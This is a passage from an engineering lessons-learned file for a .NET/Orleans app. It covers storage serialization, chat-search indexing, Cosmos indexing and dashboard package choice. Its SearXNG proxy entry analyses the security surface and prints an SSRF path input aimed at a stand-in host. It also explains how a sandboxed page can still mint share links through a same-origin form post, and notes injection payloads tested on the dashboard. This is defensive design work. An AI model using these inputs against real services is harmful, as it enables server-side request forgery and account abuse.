- **⚠ The scope is narrower than it first looks, and getting THAT wrong wastes a day.** Almost every persisted
  list is built in a **request handler** and reaches the grain as a **call argument**, and the grain-call
  boundary launders it back to a plain `List<T>` before any write. **Both transports were measured, because
  they are different mechanisms and only checking one is an evidence gap:**
  - **Remote/serialized** (the test topology — `SharedApiFixture` injects the TestCluster's external client):
    with `AgentApi.Users.cs` deliberately reverted to a bare `ToolCatalog.Sanitize(...)`,
    `ProfileToolSave_IsReadableBackFromStorage` still passed and the stored runtime type read back as
    `System.Collections.Generic.List`1[System.String]`.
  - **Local/deep-copied** (the PRODUCTION topology — `Program.cs` co-hosts the silo via `builder.UseOrleans`,
    so handler→grain calls never serialize): Orleans' `DeepCopier<T>` was measured directly and converts
    `<>z__ReadOnlyList`1` → `List`1` as well.

  So the handlers in `AgentApi.Users.cs`, `AgentApi.Mcp.cs`, `AgentApi.Models.cs` and `AgentApi.UserSkills.cs`
  are **not** at risk and "fixing" them is churn. (They were fixed and then reverted here, on evidence.)
- **The exposed case is state a grain constructs INSIDE itself and writes directly** — no serializer in
  between to launder it. That is the entire rule: **inside a grain, `.ToList()`; crossing into one, either.**
  It also explains the lone `?.ToList()` at `AgentGrain.BuildAgent.cs`'s `SetEnabledToolsAsync`, which looks
  gratuitous beside every handler that has none — it is not, and it must not be "tidied".
- **Evidence:** `src/Agent42.Agents/Mcp/UserMcpConfigGrain.cs` (`RecordToolNamesAsync`, `toolNames.ToList()`),
  `src/Agent42.Agents/Tools/AgentGrain.BuildAgent.cs` (`SetEnabledToolsAsync`, `Sanitize(tools)?.ToList()`),
  `tests/Agent42.Tests/GrainStorageSerializerTests.cs`
  (`StateBuiltInsideAGrain_WithACollectionExpression_CannotBeReadBack` — asserts the throw, so it fails loudly
  if .NET or Newtonsoft ever changes; `KnownToolNames_WrittenWithToList_SurviveTheCosmosJsonRoundTrip`),
  `tests/Agent42.Tests/ToolSelectionApiTests.cs` (`ProfileToolSave_IsReadableBackFromStorage` — asserts the
  stored type is `List<string>`, pinning the laundering rather than assuming it)
- **Verified:** 2026-09-03 (re-measured on Orleans 10.3.1; the hazard holds, only the message moved)

### Proxying a third-party app onto our own origin: both directions leak, and the route template bites

- **Claim:** ADR 0059 serves the SearXNG sidecar's own web UI at `/searxng/*` on the app's ingress.
  Four traps, and the first two are the security surface — they are why the translation rules live in
  a DI-free `SearxngProxy` that is tested as *rules*, not only through a host.
  **(1) Outbound, the app hands the sidecar its own credentials unless stopped.** The browser attaches
  the Easy Auth session cookie (`AppServiceAuthSession`, path `/`) to every `/searxng/*` request, and
  Easy Auth injects `X-MS-CLIENT-PRINCIPAL-*` — the user's id, email and name — into every request the
  backend sees. Forwarding either hands the sidecar exactly the per-user attribution ADR 0011 says
  self-hosting buys the absence of. Both are stopped by **allowlists** (`ForwardedRequestHeaders`, and
  cookies by the `sxng_` prefix), never denylists: a denylist fails open the day the app gains a cookie
  or header nobody remembered to add to it.
  **(2) Inbound, the proxied page runs on OUR origin with OUR privileges.** Absent a control, a script
  in the pinned upstream image can read the ADR 0032 IndexedDB mirror (`agent42-cache` — conversation
  text, unencrypted) and call any `/api/*` with the ambient Easy Auth cookie, including ADR 0054's
  trace dump and ADR 0035's share-link minting. **`sandbox` alone does NOT close this, and believing it
  does is the trap.** Omitting `allow-same-origin` forces an opaque origin, which stops every *read* —
  measured: IndexedDB, `document.cookie` and `localStorage` all throw `SecurityError` and a same-origin
  `fetch` is blocked, while the page still renders styled and preferences persist (SearXNG reads those
  from HTTP cookies **server-side**, and HTTP cookies still round-trip). But a sandboxed opaque-origin
  document **can still submit a form to a same-origin URL, and the browser sends the session cookie with
  it** — measured — and `POST /api/conversations/{id}/share` takes no body, so that alone mints a public
  no-login share link. The second directive is what closes it: **`form-action {scheme}://{host}/searxng/`**.
  **`form-action 'self'` is measurably useless here** — `'self'` matches the origin of the URL, not the
  document's opaque origin, so it permits every same-origin endpoint. That is why the source expression
  must carry the path, hence the scheme and host, hence a per-request header — and hence a second,
  quiet dependency on ADR 0042's `UseForwardedHeaders`, without which the policy names `http://` and
  fails closed on SearXNG's own form. Do not add `allow-same-origin` to "fix" anything.
  **(3) A trailing slash matches a LITERAL template, and the literal out-ranks the catch-all.** A
  catch-all does not match a missing segment, so `/searxng` needs its own route — but `/searxng/`, the
  canonical URL every link on the page points at, then matches **that literal route too** and wins over
  `/searxng/{**path}`. A bare `Results.Redirect(prefix + "/")` there is an **infinite redirect loop on
  the one URL that matters most**. The bare-prefix handler must test `Request.Path` for the trailing
  slash and proxy instead of redirecting.
  **(4) The catch-all value is percent-DECODED, so it is an SSRF sink.** `/searxng/%2f%2fevil.example/x`
  yields the remainder `//evil.example/x`, which `new Uri(base, remainder)` resolves protocol-relative to
  `http://evil.example/x` — dialled from inside the container. Build the upstream URI by **explicit
  concatenation onto the fixed base** with leading `/` and `\` collapsed, then re-check the resolved
  `Authority`. The same shape applies to the redirect `Location`: an absolute value is *expected* (a
  preferences save emits one from `SEARXNG_BASE_URL`, so rejecting all absolutes 502s the commonest
  redirect in the UI), so accept only the upstream authority or the request host and reject the rest —
  the app origin hosts two OAuth callbacks, so an open redirector here is not benign.
- **⚠ The SECOND such surface diverges from this entry, and the divergence is the point.** ADR 0062
  mounts the Orleans dashboard at `/dashboard` — third-party UI on our origin again — and applies **no
  CSP and no sandbox**. That is not an oversight and not "it's our own data" (an argument that was
  drafted, and is **false**: reminder names are model-supplied free text and grain primary keys are
  client-supplied, so injection-influenced content does render there). The difference is that
  `/dashboard` is **in-process** — no proxy, no forwarded headers, no upstream cookies, so the two
  outbound leaks above cannot arise — and that the escaping was **measured** rather than assumed:
  payloads in a reminder name and a grain key render inert (`&lt;img src=x …`), zero elements created,
  zero inline handlers in the document, canary never fires. See ADR 0062's Consequences for the table.
  **If you are adding a THIRD such surface, the rule is: measure, then decide.** Two instances with
  different threat models is not yet a pattern, and neither answer generalises.
- **Evidence:** `src/Agent42.Backend/Web/SearxngProxy.cs`, `src/Agent42.Backend/Web/AgentApi.Web.cs`,
  `tests/Agent42.Tests/SearxngProxyTests.cs` (`Proxy_ServesTheCanonicalSlashUrlWithoutLooping`,
  `Proxy_CannotBeSteeredOffTheSidecarByAProtocolRelativePath`, `Proxy_RejectsOffSiteRedirects`,
  `Proxy_ForwardsOnlyAllowlistedRequestHeaders`),
  `.agentic/decisions/0059-searxng-ui-behind-easy-auth-proxy.md`,
  `.agentic/decisions/0062-orleans-dashboard-owner-restricted.md`
- **Verified:** 2026-09-03 (0059 rules unchanged; the 0062 divergence added and measured)

### A named `HttpClient` cannot be re-pointed per consumer — a proxy needs its OWN

- **Claim:** Three primary-handler defaults that are right for `web_search` are wrong for a proxy, and
  because they are shared with `SearxngWebSearch` and `ConfigHealth`'s probe they cannot be changed on
  the existing `searxng` client. `AllowAutoRedirect = true` makes the client follow the 3xx itself, so
  the endpoint never sees a `Location` — the rewrite rules are then **dead in production while green in
  tests**, because a test's stub *is* the primary handler. `UseCookies = true` pools one
  `CookieContainer` across every consumer of the name, so one user's SearXNG preference cookie replays
  onto another user's request **and onto `web_search`'s own tool queries**. `AutomaticDecompression =
  None` means the proxy forwards the browser's `Accept-Encoding` and emits gzip bytes labelled
  `text/html` — though note that third one is defence in depth rather than a live bug here, since the
  browser's `Accept-Encoding` is never forwarded (it is not in the request allowlist); it matters because
  `Content-Encoding` is deliberately not copied back, so a compressed upstream response would be
  forwarded as undeclared encoded bytes. Hence a second registration, `searxng-ui`, against the same address — and it needs
  `RemoveAllResilienceHandlers()` for the same reason every other client here does (the named-client
  retry-inheritance trap).
- **Evidence:** `src/Agent42.Backend/Program.cs` (the `SearxngProxy.HttpClientName` registration),
  `tests/Agent42.Tests/SearxngProxyFixture.cs` (the stub is installed as the PRIMARY handler, deliberately)
- **Verified:** 2026-08-30

### Chat-search ordinals must come from ONE `GetHistoryAsync()` projection, on both paths

- **Claim:** the chat-search document id is `{conversationId}:{ordinal}` (ADR 0061), and the ordinal is
  the index into **`GetHistoryAsync()`'s projected list** — not a raw session-message index, and not a
  counter a caller keeps. The live write and the backfill both derive it from that one projection, so
  they cannot disagree; that is the only reason an upsert overwrites instead of appending, and so the
  only reason `ReindexAsync` is idempotent. Get it wrong and nothing throws: a live path counting raw
  session messages against a backfill counting projected turns silently **double-indexes** every
  conversation that ever had a skipped turn (an image-only turn, a turn with neither text nor image),
  because the two schemes agree exactly until the first skip and diverge by one thereafter. The
  projection skips empty-text turns, which is what makes skips ordinary rather than exotic.
- **Evidence:** `src/Agent42.Agents/Search/AgentGrain.Search.cs` (`ProjectForSearch` — the single
  projection both paths call), `tests/Agent42.Tests/ChatSearchIndexingTests.cs`
  (`Reindex_AfterLiveIndexing_ProducesNoDuplicates`, `Reindex_IsIdempotent`),
  `.agentic/decisions/0061-searchable-chat-message-projection.md`
- **Verified:** 2026-09-01

### Skipping an incognito turn's index write is NOT enough — it stays in the in-memory session

- **Claim:** ADR 0034 guarantees "not persisted, not listed", explicitly **not** "not in memory", and
  chat search is the first feature where that distinction bites. An ephemeral turn skips its
  `WriteStateAsync`, but it is still in the live `_session`, so it is still returned by
  `GetHistoryAsync()` for the rest of that activation — and the **next normal turn's re-projection
  sweeps it straight into the index**. Guarding only the ephemeral write leaves incognito text in a
  queryable Cosmos container. The fix is to advance the index cursor past the ephemeral turn without
  indexing it (`SkipIndexingForEphemeralTurnAsync`), which costs the activation's self-heal from that
  point on — deliberately, since re-indexing something incognito is a correctness failure while a
  missed repair is what the reindex endpoint is for. **Measured**, not theorised: without it
  `Indexing_ResumesOnTheNormalTurnAfterAnEphemeralOne` fails with the incognito text indexed at its
  original ordinal.
  Note also that the three write sites have **three different `_ephemeral` shapes** and must be read
  before editing: `PersistTurnUnlessEphemeralAsync` is an **early return**, `GenerateImageTurnAsync` is
  a real `if (!_ephemeral)` block, and `ReceiveReminder` has **no guard at all** — it clears
  `_ephemeral` on entry because a fired reminder always persists, so adding one there is the
  fresh-guard mistake ADR 0034 warns about.
- **Evidence:** `src/Agent42.Agents/Search/AgentGrain.Search.cs`
  (`SkipIndexingForEphemeralTurnAsync`), `src/Agent42.Agents/Conversations/AgentGrain.cs`,
  `src/Agent42.Agents/ImageGeneration/AgentGrain.ImageTurn.cs`,
  `tests/Agent42.Tests/ChatSearchIndexingTests.cs`
- **Verified:** 2026-09-01

### The chat-search write is best-effort — and that is NOT ADR 0008's rejected shape

- **Claim:** every `IChatSearchIndex` call from the grain is wrapped in its **own try/catch, logged and
  never rethrown**, including the delete inside `PurgeAsync` (which a synchronous, non-reentrant
  `DELETE /api/conversations/{id}` awaits). The index is a **projection**: losing a write costs search
  results, never conversation content, so nothing about search may be able to fail a turn.
  Do **not** describe the feature as "following ADR 0008" — 0008's *Alternatives* explicitly **rejects**
  "always-on but ungated", and its per-conversation `DocumentNames.Count > 0` gate is load-bearing. This
  takes the shape 0008 refused, and the distinction that makes it acceptable is the failure mode: 0008
  rejected a per-turn **third-party embedding round trip**, whose breakage broke every conversation,
  whereas this is a **local Cosmos upsert** — no third party, no embedding, no new egress, no new
  availability dependency. The honest cost is that a dropped write is an *invisible* gap in results,
  which is the same invisibility the backfill decision rejected; what closes it is that
  `POST /api/search/reindex` is user-invocable and idempotent, so a suspected gap is repairable.
- **Evidence:** `src/Agent42.Agents/Search/AgentGrain.Search.cs`,
  `tests/Agent42.Tests/ChatSearchIndexingTests.cs` (`ThrowingIndex_DoesNotBreakTheReply`,
  `ThrowingIndex_DoesNotBreakPurge`),
  `.agentic/decisions/0008-always-on-textsearchprovider-retrieval.md` (Alternatives)
- **Verified:** 2026-09-01

### A multi-property `ORDER BY` needs a composite index, or chat search 400s — and it looks like "no matches"

- **Claim:** Cosmos NoSQL serves a **single**-property `ORDER BY` from the default range index, but a
  **multi**-property one is a hard **400** — *"The order by query does not have a corresponding composite
  index that it can be served from"* — unless that exact path sequence is declared as a `compositeIndexes`
  entry on the container. ADR 0061 shipped `BuildSearchSql` ordering by `c.conversationId, c.ordinal`
  against a `chat-messages` container that declared **no composite index at all**, so every
  `GET /api/search` with a non-blank query failed in production. Note the irony before removing the
  `ORDER BY` to "fix" it: it is there deliberately (without it `TOP` returns an arbitrary *n*, diverging
  from `InMemoryChatSearchIndex`), so the composite index is the fix and dropping the ordering is not.
  **Two things made it hide unusually well, and both generalise.** Writes were never affected —
  `IndexTurnsAsync` is an `UpsertItemAsync`, which runs no query — so the corpus filled up normally and
  only *reads* were broken, which rules out "the index must be empty" as the first hypothesis. And
  `search.js` maps a non-ok response to zero hits (`hits = res.ok ? … : []`), so the 400 rendered as the
  ordinary **"no matches"** row: a 409 (index unregistered), a 500, an offline fetch and a genuinely
  empty result are **visually identical** in the sidebar. When search returns nothing, read the status
  code of `/api/search` before theorising.
  The composite index is also the **one** part of this container that can be changed after creation —
  unlike `fullTextPolicy` — so the repair is a plain Bicep redeploy with a background reindex, no
  migration and no re-backfill.
- **Evidence:** `infra/modules/cosmos.bicep` (`chatMessagesContainer.indexingPolicy.compositeIndexes`),
  `src/Agent42.Backend/Search/CosmosChatSearchIndex.cs` (`BuildSearchSql`),
  `src/Agent42.Backend/wwwroot/js/search.js` (`runSearch`),
  `tests/Agent42.Tests/CompositeIndexMatchesTheSearchQueryTests.cs` — which pins the SQL's `ORDER BY`
  against the Bicep and was **mutation checked** three ways (index removed, paths swapped, direction
  flipped; each fails only the assertion that should catch it)
- **Verified:** 2026-09-02

### The community `OrleansDashboard` package does not start the silo on Orleans 10.x — it CRASHES PROD

- **Claim:** there are two packages with almost the same name, and picking the wrong one takes the whole
  app down rather than producing a broken page. Use **`Microsoft.Orleans.Dashboard`** (the official one,
  versioned with the Orleans stack). **Never** `OrleansDashboard` (the community one).
  Measured on Orleans 10.2.2 with `OrleansDashboard` 8.2.0 — its latest, built 2024-07-13:

  ```
  System.MissingMethodException: Method not found:
  '!!0 Orleans.Serialization.Invocation.ITargetHolder.GetTarget()'
  ```

  thrown from its pre-baked `OrleansCodeGen.OrleansDashboard.Invokable_*` types. The exception is
  **unhandled out of `Silo.StartAsync`**, so the silo never starts.
- **⚠ Why that is a production outage and not a broken page.** The app co-hosts the silo in the same
  process (`builder.UseOrleans`), so a silo that will not start is a process that will not start. In
  Container Apps revision health is gated on **every** container in the replica — the same mechanism
  that makes a crash-looping SearXNG sidecar take the backend down — so this is the `SEARXNG_SECRET`
  failure shape (on the availability path), not the `GOOGLE_MAPS_API_KEY` one (degrades per call).
  It is also **invisible to a code review**: the two package ids differ by a prefix, both compile, and
  the API surfaces are similar enough that the calling code looks right either way.
- **It fails the vulnerability gate too, independently.** Its dependency tree pulls
  `OpenTelemetry.Api` 1.9.0, which carries a known moderate advisory — a `vulnerable_packages: 0`
  failure on its own, before the silo is even reached.
- **Upstream is not going to fix it.** Issue #450 was closed without a fix; the project was deprecated
  in Nov 2025 and merged into `dotnet/orleans` (PR #9751). The official package IS that merge.
- **The guard matches the exact `Include` attribute, and must keep doing so.**
  `Assert.DoesNotContain("Include=\"OrleansDashboard\"", …)` — a bare `Contains("Dashboard")` would
  false-positive on `Microsoft.Orleans.Dashboard`, which this repo legitimately references, so the test
  would fail on the correct state. The same test also asserts the Microsoft package IS present, so it
  cannot pass by the whole section being deleted.
- **Two more measured facts about the official package**, both worth knowing before touching it:
  it installs a `GrainProfilerFilter` as an `IIncomingGrainCallFilter`, so **every** grain call is
  profiled — including `AgentGrain`'s non-reentrant turn path — and it opens **no listener of its own**
  (`DashboardOptions` has no `Port`/`HostSelf`, unlike the community package). The second one matters:
  containers in one Container App share a network namespace, so a self-hosted dashboard port would have
  been reachable from the SearXNG sidecar, which ADR 0059 treats as untrusted. It is not.
- **Evidence:** `Directory.Packages.props` (the pin, with the ban in a comment beside it),
  `tests/Agent42.Tests/QualityGateTests.cs`
  (`Packages_DoNotReferenceTheDeprecatedCommunityDashboard`),
  `src/Agent42.Backend/Orleans/DashboardRegistration.cs`,
  `.agentic/decisions/0062-orleans-dashboard-owner-restricted.md`
- **Verified:** 2026-09-03
